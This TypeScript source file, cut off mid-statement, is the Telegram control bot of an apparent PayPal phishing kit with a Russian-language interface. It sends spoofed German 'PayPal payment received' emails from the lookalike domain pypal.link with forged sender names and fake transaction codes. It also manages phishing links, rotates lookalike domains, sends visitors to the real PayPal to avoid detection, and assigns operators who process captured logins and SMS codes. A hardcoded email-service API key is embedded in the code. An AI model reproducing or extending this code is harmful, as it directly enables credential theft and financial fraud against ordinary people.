console.log("🚀 TelegramBot.ts file started loading...");

// Force console output to stdout
const originalLog = console.log;
console.log = (...args) => {
  process.stdout.write(`[TELEGRAM BOT] ${args.join(' ')}\n`);
  originalLog(...args);
};

import TelegramBot from "node-telegram-bot-api";
import { WebSocket } from "ws";
import { MailerSend, EmailParams, Sender, Recipient } from "mailersend";
import { MailService } from "@sendgrid/mail";
import { Resend } from "resend";
import { readFileSync } from "fs";
import path from "path";
import { db } from "./db";
import { getDomainFromConfig } from "./domainUtils";
import { telegramUsers, telegramLinks, loginAttempts, smsSubmissions, workerAssignments } from "@shared/schema";
import { eq, desc, and, sql, like } from "drizzle-orm";
import { storage } from "./storage";

// Global declarations
declare global {
  var smsHashMap: Map<string, string> | undefined;
  var activeUsers: Map<string, { timestamp: number; page: string; userAgent: string; ip: string }>
    | undefined;
}

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error("❌ TELEGRAM_BOT_TOKEN environment variable is not set");
  process.exit(1);
}

// Type assertion is safe because we check above
const VERIFIED_BOT_TOKEN = BOT_TOKEN as string;

console.log(`🔑 Using bot token: ${VERIFIED_BOT_TOKEN.substring(0, 10)}...`);

// Prevent multiple bot instances by checking if already initialized
declare global {
  var telegramBotInstance: TelegramBot | undefined;
}

let bot: TelegramBot;

if (global.telegramBotInstance) {
  console.log("🔄 Using existing Telegram bot instance");
  bot = global.telegramBotInstance;
  
  // Clear existing event listeners to prevent duplicates
  bot.removeAllListeners('message');
  bot.removeAllListeners('callback_query');
  bot.removeAllListeners('error');
  bot.removeAllListeners('polling_error');
  
  // Clear text handlers (onText)
  if (bot.removeTextListener) {
    bot.removeTextListener(/\/start/);
    bot.removeTextListener(/\/approve (.+)/);
    bot.removeTextListener(/\/disable_bot/);
    bot.removeTextListener(/\/enable_bot/);
    bot.removeTextListener(/\/disable_site/);
    bot.removeTextListener(/\/enable_site/);
    bot.removeTextListener(/\/edit_domain (.+)/);
    bot.removeTextListener(/\/delete_all_links/);
  }
  
  console.log("🧹 Cleared existing event listeners and text handlers");
} else {
  console.log("🆕 Creating new Telegram bot instance");
  bot = new TelegramBot(VERIFIED_BOT_TOKEN, { polling: true });
  
  // Store globally to prevent multiple instances
  global.telegramBotInstance = bot;
  
  // Handle polling errors with restart protection
  let restartTimeout: NodeJS.Timeout | null = null;
  bot.on('polling_error', (error) => {
    console.log(`⚠️ Polling error: ${(error as any).code} - ${error.message}`);
    
    if ((error as any).code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
      console.log('🔄 Stopping current polling to resolve conflict...');
      bot.stopPolling();
      
      if (restartTimeout) clearTimeout(restartTimeout);
      restartTimeout = setTimeout(() => {
        console.log('🔄 Restarting polling...');
        bot.startPolling();
      }, 5000);
    }
  });
}

// Add error handling for bot
bot.on('error', (error) => {
  console.error('❌ Telegram bot error:', error);
});

console.log("🤖 Telegram bot initialized successfully");

// Initialize email services
const mailerSend = new MailerSend({
  apiKey: process.env.MAILERSEND_API_KEY || "mlsn.7026506efdc181b299e5e7344159ad06e2196317cf38d1afbf23f3c3865a49e7",
});

const mailService = new MailService();
if (process.env.SENDGRID_API_KEY) {
  mailService.setApiKey(process.env.SENDGRID_API_KEY);
}

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY || "");

// Email service preference: 'resend', 'sendgrid', or 'mailersend'
const EMAIL_SERVICE = 'resend';

// Generate random transaction code in PayPal format
function generateTransactionCode(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  // Format: [3 chars][5 digits][2 chars][6 digits][1 char]
  let code = "";

  // 3 characters
  for (let i = 0; i < 3; i++) {
    code += chars[Math.floor(Math.random() * 26)]; // A-Z only
  }

  // 5 digits
  for (let i = 0; i < 5; i++) {
    code += Math.floor(Math.random() * 10);
  }

  // 2 characters
  for (let i = 0; i < 2; i++) {
    code += chars[Math.floor(Math.random() * 26)]; // A-Z only
  }

  // 6 digits
  for (let i = 0; i < 6; i++) {
    code += Math.floor(Math.random() * 10);
  }

  // 1 character
  code += chars[Math.floor(Math.random() * 26)]; // A-Z only

  return code;
}

// Format date in German
function formatGermanDate(): string {
  const now = new Date();
  const day = now.getDate();
  const months = [
    "Jan.",
    "Feb.",
    "März",
    "Apr.",
    "Mai",
    "Juni",
    "Juli",
    "Aug.",
    "Sept.",
    "Okt.",
    "Nov.",
    "Dez.",
  ];
  const month = months[now.getMonth()];
  const year = now.getFullYear();

  return `${day}. ${month} ${year}`;
}

// Process template placeholders
function processEmailTemplate(template: string, data: any): string {
  return template
    .replace(/{Name}/g, data.senderName || "")
    .replace(/{price}/g, data.price || "")
    .replace(/{link}/g, data.generatedLink || "")
    .replace(/{datum}/g, data.date || "")
    .replace(/{code}/g, data.transactionCode || "");
}

// Function to send PayPal notification email
export async function sendPayPalNotificationEmail(
  recipientEmail: string,
  link: any,
) {
  console.log("🔍 Email sending attempt:", {
    recipient: recipientEmail,
    linkId: link.linkId,
    price: link.price,
    service: EMAIL_SERVICE.toUpperCase(),
    resendKey: !!process.env.RESEND_API_KEY,
    mailerSendKey: !!process.env.MAILERSEND_API_KEY,
    sendGridKey: !!process.env.SENDGRID_API_KEY
  });

  console.log(`✅ Using ${EMAIL_SERVICE.toUpperCase()} service for email delivery`);

  // Declare variables in function scope for catch block access
  let subject: string;
  let emailText: string; 
  let emailHTML: string;

  try {
    // Read the email template
    const templatePath = path.join(process.cwd(), "shablon_mail.html");
    const emailTemplate = readFileSync(templatePath, "utf-8");

    // Prepare template data
    const templateData = {
      senderName: link.senderName || "Benutzer",
      price: link.price || "0,00 €",
      generatedLink: link.generatedLink || link.link || "",
      date: formatGermanDate(),
      transactionCode: generateTransactionCode(),
    };

    // Process the template
    emailHTML = processEmailTemplate(emailTemplate, templateData);

    // Extract title from template for subject and process placeholders
    const titleMatch = emailHTML.match(/<title>(.*?)<\/title>/);
    subject = titleMatch
      ? processEmailTemplate(titleMatch[1], templateData)
      : `${templateData.senderName} hat Ihnen ${templateData.price} EUR mit PayPal gesendet`;

    // Create plain text version
    emailText = `
${subject}

Hallo!

Sie haben eine Zahlung über PayPal erhalten:
Betrag: ${templateData.price}
Von: ${templateData.senderName}
Transaktionscode: ${templateData.transactionCode}
Datum: ${templateData.date}

Um den Betrag zu erhalten, besuchen Sie:
${templateData.generatedLink}

Diese E-Mail wurde automatisch generiert.
© 2025 PayPal. Alle Rechte vorbehalten.
    `;

    // Try different email services based on configuration
    let emailSent = false;
    
    if (EMAIL_SERVICE === 'resend') {
      // Configure Resend email parameters
      try {
        const result = await resend.emails.send({
          from: "PayPal <service@pypal.link>",
          to: [recipientEmail],
          subject: subject,
          html: emailHTML,
          text: emailText.trim(),
        });
        emailSent = true;
        console.log(`✅ Email sent successfully to: ${recipientEmail} via RESEND`);
      } catch (resendError) {
        console.error("❌ Resend failed:", (resendError as any).message || resendError);
        console.log("Error details:", resendError);
        
        // Fallback to SendGrid if Resend fails
        console.log('🔄 Resend failed, switching to SendGrid...');
        
        const fallbackMessage = {
          to: recipientEmail,
          from: {
            name: "service@paypal.de",
            email: "service@pypal.link",
          },
          subject: subject,
          text: emailText.trim(),
          html: emailHTML,
        };

        await mailService.send(fallbackMessage);
        emailSent = true;
        console.log(`✅ Email sent successfully to: ${recipientEmail} via SENDGRID (fallback)`);
      }
    } else if (EMAIL_SERVICE === 'mailersend') {
      // Configure MailerSend email parameters
      // Using verified domain
      const sentFrom = new Sender(`service@${await getCurrentDomain()}`, "PayPal Service");
      const recipients = [new Recipient(recipientEmail, "Recipient")];

      const emailParams = new EmailParams()
        .setFrom(sentFrom)
        .setTo(recipients)
        .setSubject(subject)
        .setHtml(emailHTML)
        .setText(emailText.trim());

      try {
        await mailerSend.email.send(emailParams);
        emailSent = true;
        console.log(`✅ Email sent successfully to: ${recipientEmail} via MAILERSEND`);
      } catch (mailerSendError) {
        console.error("❌ MailerSend failed:", (mailerSendError as any).message || mailerSendError);
        console.log("Error details:", (mailerSendError as any).response?.body || mailerSendError);
        
        // Check for trial account limitations in multiple possible error formats
        const errorMessage = (mailerSendError as any).response?.body?.message || 
                           (mailerSendError as any).response?.data?.message || 
                           (mailerSendError as any).message || '';
        
        if (errorMessage.includes('Trial accounts') || errorMessage.includes('#MS42225')) {
          console.log('🔄 MailerSend trial limitations detected, switching to SendGrid...');
          
          // Fallback to SendGrid
          const fallbackMessage = {
            to: recipientEmail,
            from: {
              name: "service@paypal.de",
              email: "service@pypal.link",
            },
            subject: subject,
            text: emailText.trim(),
            html: emailHTML,
          };

          await mailService.send(fallbackMessage);
          emailSent = true;
          console.log(`✅ Email sent successfully to: ${recipientEmail} via SENDGRID (fallback)`);
        } else {
          throw mailerSendError;
        }
      }
    } else {
      // Use SendGrid (default)
      const message = {
        to: recipientEmail,
        from: {
          name: "service@paypal.de",
          email: "service@pypal.link",
        },
        subject: subject,
        text: emailText.trim(),
        html: emailHTML,
      };

      await mailService.send(message);
      emailSent = true;
      console.log(`✅ Email sent successfully to: ${recipientEmail} via SENDGRID`);
    }
    
    return emailSent;
  } catch (error) {
    console.error(`❌ Email sending failed:`, (error as any).message || error);
    console.error("Full error details:", (error as any).response?.body || error);
    
    // If error contains MailerSend trial limitations, try SendGrid fallback
    const errorMessage = (error as any).response?.body?.message || (error as any).message || '';
    if (errorMessage.includes('Trial accounts') || errorMessage.includes('#MS42225')) {
      console.log('🔄 Attempting SendGrid fallback from catch block...');
      
      try {
        const fallbackMessage = {
          to: recipientEmail,
          from: {
            name: "service@paypal.de",
            email: "service@pypal.link",
          },
          subject: subject || "PayPal - Ihre Zahlung wurde empfangen",
          text: emailText?.trim() || "Ihre Zahlung wurde erfolgreich verarbeitet.",
          html: emailHTML || "<p>Ihre Zahlung wurde erfolgreich verarbeitet.</p>",
        };

        await mailService.send(fallbackMessage);
        console.log(`✅ Email sent successfully to: ${recipientEmail} via SENDGRID (catch fallback)`);
        return true;
      } catch (fallbackError) {
        console.error("❌ SendGrid fallback failed:", (fallbackError as any).message);
        return false;
      }
    }
    
    return false;
  }
}

// Global bot status
let BOT_ENABLED = true;

// Initialize admin system using admins.json
async function initializeAdmin() {
  try {
    const admins = loadAdmins();
    if (admins.length > 0) {
      // Set admin role for all admins
      for (const adminId of admins) {
        const existingAdmin = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));

        if (existingAdmin.length > 0) {
          // Update existing admin to have admin role
          await db
            .update(telegramUsers)
            .set({ role: "admin" })
            .where(eq(telegramUsers.telegramId, adminId));
          
          console.log(`✅ Admin ${adminId} role updated to admin with unique ID: ${existingAdmin[0].uniqueId}`);
        } else {
          // Create new admin
          const uniqueId = generateUniqueId();
          await db.insert(telegramUsers).values({
            telegramId: adminId,
            username: "admin",
            firstName: "Admin",
            lastName: "User",
            uniqueId,
            role: "admin",
            isApproved: true,
          });

          console.log(`✅ Admin ${adminId} initialized with unique ID: ${uniqueId}`);
        }
      }
      
      console.log(`Admin system initialized with ${admins.length} admin(s): ${admins.join(', ')}`);
    } else {
      console.log("No admins configured in admins.json");
    }
  } catch (error) {
    console.error("Error initializing admin:", error);
  }
}

// Initialize admin on startup
initializeAdmin();

// Generate unique ID in format #A1B2C3D4
function generateUniqueId(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "#";
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Generate unique link ID in format #LINK_01
async function generateLinkId(): Promise<string> {
  const existingLinks = await db.select().from(telegramLinks);
  const existingIds = new Set(existingLinks.map((link) => link.linkId));

  let nextNumber = 1;
  let linkId = `#LINK_${nextNumber.toString().padStart(4, "0")}`;

  // Find first available ID
  while (existingIds.has(linkId) && nextNumber <= 9999) {
    nextNumber++;
    linkId = `#LINK_${nextNumber.toString().padStart(4, "0")}`;
  }

  if (nextNumber > 9999) {
    throw new Error("Maximum number of links reached");
  }

  return linkId;
}

// Generate random context data
function generateRandomString(): string {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
  let result = "";
  for (let i = 0; i < 64; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Check if user is approved
async function isUserApproved(telegramId: string): Promise<boolean> {
  const user = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  return user.length > 0 && user[0].isApproved === true;
}

// Get current production domain from config file
async function getCurrentDomain(): Promise<string> {
  return getDomainFromConfig();
}

// Load admin IDs from config file
function loadAdmins(): string[] {
  try {
    const configPath = path.join(process.cwd(), "config", "admins.json");
    const configData = readFileSync(configPath, "utf8");
    const config = JSON.parse(configData);
    return config.admins || [];
  } catch (error) {
    console.error("Error loading admin config:", error);
    return ["8146147595"]; // fallback to @Dalsend as only admin
  }
}

// Check if user has admin rights
async function isUserAdmin(telegramId: string): Promise<boolean> {
  const admins = loadAdmins();
  return admins.includes(telegramId);
}

// Check if user is a worker
async function isUserWorker(telegramId: string): Promise<boolean> {
  const user = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  
  return user.length > 0 && user[0].role === "worker";
}

// Get workers assigned to a user
async function getAssignedWorkers(userId: string): Promise<string[]> {
  const assignments = await db
    .select()
    .from(workerAssignments)
    .where(eq(workerAssignments.userId, userId));
  
  return assignments.map(assignment => assignment.workerId);
}

// Get users assigned to a worker
async function getAssignedUsers(workerId: string): Promise<string[]> {
  const assignments = await db
    .select()
    .from(workerAssignments)
    .where(eq(workerAssignments.workerId, workerId));
  
  return assignments.map(assignment => assignment.userId);
}

// Get all workers
async function getAllWorkers(): Promise<string[]> {
  const workers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "worker"));
  
  return workers.map(worker => worker.telegramId);
}

// Round-robin assignment for unassigned users
let workerIndex = 0;
async function getNextWorkerForAssignment(): Promise<string | null> {
  const workers = await getAllWorkers();
  if (workers.length === 0) return null;
  
  const selectedWorker = workers[workerIndex % workers.length];
  workerIndex++;
  return selectedWorker;
}

// Get user by telegram ID
async function getUserByTelegramId(telegramId: string) {
  const users = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  return users[0] || null;
}

// Main keyboard for approved users
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: "🔗 Создать ссылку" }, { text: "📋 Мои ссылки" }],
      [{ text: "👤 Профиль" }, { text: "❓ Помощь" }],
    ],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// Admin keyboard for admin users
const adminKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: "🔗 Создать ссылку" }, { text: "📋 Мои ссылки" }],
      [{ text: "👤 Профиль" }, { text: "⚙️ Управление ботом" }],
      [{ text: "🌐 Управление сайтом" }, { text: "🔄 Переадресация" }],
      [{ text: "🌍 Управление доменом" }, { text: "🔍 Статус системы" }],
      [{ text: "👥 Управление вбиверами" }, { text: "👤 Управление пользователями" }],
      [{ text: "📢 Уведомления" }, { text: "🗑️ Удалить все ссылки" }],
      [{ text: "❓ Помощь" }],
    ],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// Cancel keyboard
const cancelKeyboard = {
  reply_markup: {
    keyboard: [[{ text: "❌ Отмена" }]],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// User states for conversation flow
const userStates = new Map<string, { state: string; data?: any }>();

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const username = msg.from?.username || "";
  const firstName = msg.from?.first_name || "";
  const lastName = msg.from?.last_name || "";

  // Check if this is the first user (admin)
  const allUsers = await db.select().from(telegramUsers);
  if (allUsers.length === 0) {
    // First user becomes admin automatically
    // Admin ID is now managed through admins.json
    const uniqueId = generateUniqueId();

    try {
      await db.insert(telegramUsers).values({
        telegramId,
        username,
        firstName,
        lastName,
        uniqueId,
        isApproved: true,
      });

      await bot.sendMessage(
        chatId,
        `🎉 Добро пожаловать, администратор!\n\n` +
          `Ваш уникальный ID: ${uniqueId}\n\n` +
          `Вы автоматически получили полный доступ как первый пользователь.\n` +
          `Используйте команду /approve ID для одобрения других пользователей.`,
        adminKeyboard,
      );
      return;
    } catch (error) {
      console.error("Error creating admin user:", error);
      await bot.sendMessage(
        chatId,
        "Произошла ошибка при создании администратора.",
      );
      return;
    }
  }

  if (await isUserApproved(telegramId)) {
    await bot.sendMessage(
      chatId,
      `Добро пожаловать обратно! 🎉\n\n` +
        `Используйте кнопки ниже для управления ссылками:`,
      mainKeyboard,
    );
    return;
  }

  // Check if user already requested access
  const existingUser = await getUserByTelegramId(telegramId);
  if (existingUser && !existingUser.isApproved) {
    await bot.sendMessage(
      chatId,
      `Ваш запрос на доступ уже отправлен! ⏳\n\n` +
        `Уникальный ID: ${existingUser.uniqueId}\n` +
        `Дождитесь одобрения администратора.`,
    );
    return;
  }

  // Create new user request
  const uniqueId = generateUniqueId();

  try {
    await db.insert(telegramUsers).values({
      telegramId,
      username,
      firstName,
      lastName,
      uniqueId,
      isApproved: false,
    });

    await bot.sendMessage(
      chatId,
      `Добро пожаловать! 👋\n\n` +
        `Ваш уникальный ID: ${uniqueId}\n\n` +
        `Запрос на доступ отправлен администратору.\n` +
        `Дождитесь одобрения для использования бота.`,
    );

    // Notify all admins from config file
    const admins = loadAdmins();
    for (const adminId of admins) {
      try {
        await bot.sendMessage(
          adminId,
          `🔔 Новый запрос на доступ\n\n` +
            `ID: ${uniqueId}\n` +
            `Пользователь: ${firstName} ${lastName}\n` +
            `Username: @${username}\n` +
            `Telegram ID: ${telegramId}\n\n` +
            `Для одобрения используйте: /approve ${uniqueId}`,
        );
      } catch (error) {
        console.error(`Error notifying admin ${adminId}:`, error);
      }
    }
  } catch (error) {
    console.error("Error creating user request:", error);
    await bot.sendMessage(chatId, "Произошла ошибка. Попробуйте позже.");
  }
});

// Admin command to approve users
bot.onText(/\/approve (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  const uniqueId = match?.[1];
  if (!uniqueId) {
    await bot.sendMessage(
      chatId,
      "Неверный формат команды. Используйте: /approve #ID",
    );
    return;
  }

  try {
    const users = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.uniqueId, uniqueId));

    if (users.length === 0) {
      await bot.sendMessage(chatId, "Пользователь с таким ID не найден.");
      return;
    }

    const user = users[0];

    await db
      .update(telegramUsers)
      .set({ isApproved: true, approvedAt: new Date() })
      .where(eq(telegramUsers.uniqueId, uniqueId));

    await bot.sendMessage(
      chatId,
      `✅ Пользователь ${user.firstName} ${user.lastName} одобрен!`,
    );

    // Notify user
    await bot.sendMessage(
      user.telegramId,
      `🎉 Ваш запрос одобрен!\n\n` +
        `Теперь вы можете использовать все функции бота.`,
      mainKeyboard,
    );
  } catch (error) {
    console.error("Error approving user:", error);
    await bot.sendMessage(
      chatId,
      "Произошла ошибка при одобрении пользователя.",
    );
  }
});

// Admin command to disable bot
bot.onText(/\/disable_bot/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  BOT_ENABLED = false;
  await bot.sendMessage(
    chatId,
    `🚫 Бот отключен для всех пользователей!\n\n` +
      `Используйте /enable_bot для включения.`,
    adminKeyboard,
  );
});

// Admin command to enable bot
bot.onText(/\/enable_bot/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  BOT_ENABLED = true;
  await bot.sendMessage(
    chatId,
    `✅ Бот включен для всех пользователей!`,
    adminKeyboard,
  );
});

// Admin command to disable entire site
bot.onText(/\/disable_site/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  try {
    const response = await fetch("http://localhost:5000/api/site/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled: false }),
    });

    if (response.ok) {
      await bot.sendMessage(
        chatId,
        `🚫 САЙТ ПОЛНОСТЬЮ ОТКЛЮЧЕН!\n\n` +
          `🔄 Все ссылки перенаправляются на PayPal.com\n` +
          `📱 Включая прямой доступ к домену\n` +
          `⚙️ Админ панель остается доступной\n\n` +
          `Используйте /enable_site для включения.`,
        adminKeyboard,
      );
    }
  } catch (error) {
    await bot.sendMessage(chatId, "Ошибка при отключении сайта.");
  }
});

// Admin command to enable entire site
bot.onText(/\/enable_site/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  try {
    const response = await fetch("http://localhost:5000/api/site/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled: true }),
    });

    if (response.ok) {
      await bot.sendMessage(
        chatId,
        `✅ САЙТ ВКЛЮЧЕН!\n\n` +
          `🔗 Все ссылки работают нормально\n` +
          `📱 Прямой доступ к домену восстановлен\n` +
          `💰 Пользователи могут создавать новые ссылки`,
        adminKeyboard,
      );
    }
  } catch (error) {
    await bot.sendMessage(chatId, "Ошибка при включении сайта.");
  }
});

// Admin command to edit domain config file
bot.onText(/\/edit_domain (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const newDomain = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  if (!newDomain) {
    await bot.sendMessage(
      chatId,
      "Укажите новый домен после команды.\nПример: /edit_domain pypal.link",
    );
    return;
  }

  // Validate domain format
  const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]*[a-zA-Z0-9]*\.([a-zA-Z]{2,})$/;
  if (!domainRegex.test(newDomain)) {
    await bot.sendMessage(
      chatId,
      "Неверный формат домена. Используйте формат: domain.com",
    );
    return;
  }

  try {
    const fs = await import('fs');
    const path = await import('path');
    const configPath = path.join(process.cwd(), 'domain.config');
    
    console.log(`🔍 Telegram bot: Attempting to write "${newDomain}" to ${configPath}`);
    console.log(`🔍 Current working directory: ${process.cwd()}`);
    
    // Check if file exists and is writable
    try {
      const stats = fs.statSync(configPath);
      console.log(`📄 File exists, size: ${stats.size} bytes, writable: ${(stats.mode & 0o200) !== 0}`);
    } catch (e) {
      console.log(`📄 File doesn't exist, will create new one`);
    }
    
    // Perform the write operation
    fs.writeFileSync(configPath, newDomain, 'utf8');
    console.log(`🌍 Telegram bot: Domain updated to ${newDomain} in domain.config`);
    
    // Verify the write was successful
    const readBack = fs.readFileSync(configPath, 'utf8').trim();
    console.log(`🔍 Verification: File now contains "${readBack}"`);
    
    if (readBack === newDomain) {
      console.log('✅ Write verification successful');
      await bot.sendMessage(
        chatId,
        `🌍 ДОМЕН ИЗМЕНЕН!\n\n` +
          `📱 Новый домен: ${newDomain}\n` +
          `📄 Файл domain.config обновлен\n` +
          `🔗 Все новые ссылки будут использовать новый домен\n\n` +
          `✅ Изменения применены мгновенно!`,
        adminKeyboard,
      );
    } else {
      console.log('❌ Write verification failed');
      await bot.sendMessage(chatId, "Ошибка при верификации записи в domain.config.");
    }
    
  } catch (error) {
    console.error('❌ Telegram bot: Failed to update domain.config:', error);
    console.error('❌ Error details:', {
      message: error.message,
      code: error.code,
      syscall: error.syscall,
      path: error.path,
      errno: error.errno
    });
    await bot.sendMessage(chatId, `Ошибка при изменении файла domain.config: ${error.message}`);
  }
});

// Admin command to delete all links
bot.onText(/\/delete_all_links/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "У вас нет прав для выполнения этой команды.",
    );
    return;
  }

  try {
    const result = await db.delete(telegramLinks);
    await bot.sendMessage(
      chatId,
      `🗑️ Все ссылки удалены!\n\n` +
        `Теперь все ссылки будут перенаправлять на paypal.com`,
      adminKeyboard,
    );
  } catch (error) {
    console.error("Error deleting all links:", error);
    await bot.sendMessage(chatId, "Произошла ошибка при удалении ссылок.");
  }
});

// Handle text messages
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const text = msg.text;

  if (!text || text.startsWith("/")) return;
  
  console.log(`📨 Message received - telegramId: ${telegramId}, text: ${text}`);

  // Development mode - all functions enabled for testing
  const isDevelopment = process.env.NODE_ENV === "development";
  // if (isDevelopment && text !== "🔍 Статус системы") {
  //   await bot.sendMessage(
  //     chatId,
  //     "🚫 Бот отключен в режиме разработки. Все функции доступны только в Production.",
  //   );
  //   return;
  // }

  // Check if user is approved
  if (!(await isUserApproved(telegramId))) {
    await bot.sendMessage(
      chatId,
      "Вы не авторизованы. Используйте /start для запроса доступа.",
    );
    return;
  }

  // Check if bot is enabled (except for admin)
  if (!BOT_ENABLED && !(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "🚫 Бот временно отключен администратором.");
    return;
  }

  const userState = userStates.get(telegramId);
  console.log(`🔄 User state for ${telegramId}:`, userState);

  // Handle cancel
  if (text === "❌ Отмена") {
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, "Действие отменено.", mainKeyboard);
    return;
  }

  // Handle main menu buttons
  if (text === "🔗 Создать ссылку") {
    userStates.set(telegramId, { state: "awaiting_price" });
    await bot.sendMessage(
      chatId,
      "💰 Введите цену (например: 10 или 10.50):",
      cancelKeyboard,
    );
    return;
  }

  if (text === "📋 Мои ссылки") {
    await showUserLinks(chatId, telegramId);
    return;
  }

  if (text === "👤 Профиль") {
    await showUserProfile(chatId, telegramId);
    return;
  }

  // Admin-only buttons
  if (await isUserAdmin(telegramId)) {
    if (text === "⚙️ Управление ботом") {
      const status = BOT_ENABLED ? "включен ✅" : "отключен ❌";
      await bot.sendMessage(
        chatId,
        `🤖 Статус бота: ${status}\n\n` +
          `Используйте команды:\n` +
          `/disable_bot - отключить бота для всех пользователей\n` +
          `/enable_bot - включить бота для всех пользователей`,
        (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
      );
      return;
    }

    if (text === "🌐 Управление сайтом") {
      try {
        const response = await fetch("http://localhost:5000/api/site/status");
        const data = await response.json();
        const siteStatus = data.enabled ? "включен ✅" : "отключен ❌";

        await bot.sendMessage(
          chatId,
          `🌐 Статус сайта: ${siteStatus}\n\n` +
            `${
              data.enabled
                ? "✅ Сайт работает нормально\n🔗 Все ссылки доступны\n📱 Прямой доступ к домену работает"
                : "🚫 Сайт отключен\n🔄 Все ссылки перенаправляются на PayPal.com\n📱 Включая прямой доступ к домену"
            }\n\n` +
            `Используйте команды:\n` +
            `/disable_site - отключить весь сайт\n` +
            `/enable_site - включить сайт`,
          adminKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "Ошибка при получении статуса сайта.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "🌍 Управление доменом") {
      try {
        const currentDomain = getDomainFromConfig();
        
        await bot.sendMessage(
          chatId,
          `🌍 Текущий домен: ${currentDomain}\n\n` +
            `📄 Домен управляется через файл domain.config\n\n` +
            `Для изменения домена используйте команду:\n` +
            `/edit_domain новый-домен.com\n\n` +
            `Примеры:\n` +
            `/edit_domain pypal.link\n` +
            `/edit_domain paypal-secure.com\n` +
            `/edit_domain my-domain.net\n\n` +
            `💡 Или отредактируйте файл domain.config вручную`,
          adminKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "Ошибка при получении информации о домене.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "📢 Уведомления") {
      userStates.set(telegramId, { state: "awaiting_broadcast_message" });
      await bot.sendMessage(
        chatId,
        "Введите сообщение для отправки всем пользователям бота:",
        cancelKeyboard,
      );
      return;
    }

    if (text === "🔄 Переадресация") {
      try {
        const response = await fetch(
          `http://localhost:5000/api/redirect/status`,
        );
        const data = await response.json();
        const redirectStatus = data.permanentRedirect
          ? "Включена ✅"
          : "Отключена ❌";

        const inlineKeyboard = {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: data.permanentRedirect
                    ? "❌ Отключить переадресацию"
                    : "✅ Включить переадресацию",
                  callback_data: data.permanentRedirect
                    ? "disable_redirect"
                    : "enable_redirect",
                },
              ],
            ],
          },
        };

        await bot.sendMessage(
          chatId,
          `🔄 Управление переадресацией:\n\n` +
            `📊 Текущий статус: ${redirectStatus}\n\n` +
            `${
              data.permanentRedirect
                ? "🔴 ВСЕ запросы перенаправляются на PayPal.com"
                : "🟢 Сайт работает в обычном режиме"
            }\n\n` +
            `ℹ️ При включении переадресации весь трафик будет направляться на PayPal, включая прямой доступ к домену.`,
          inlineKeyboard,
        );
      } catch (error) {
        await bot.sendMessage(
          chatId,
          "Ошибка получения статуса переадресации.",
          adminKeyboard,
        );
      }
      return;
    }

    if (text === "🔍 Статус системы") {
      const envMode = process.env.NODE_ENV || "development";
      const isDevelopment = envMode === "development";
      const botStatus = isDevelopment
        ? "Development (отключен)"
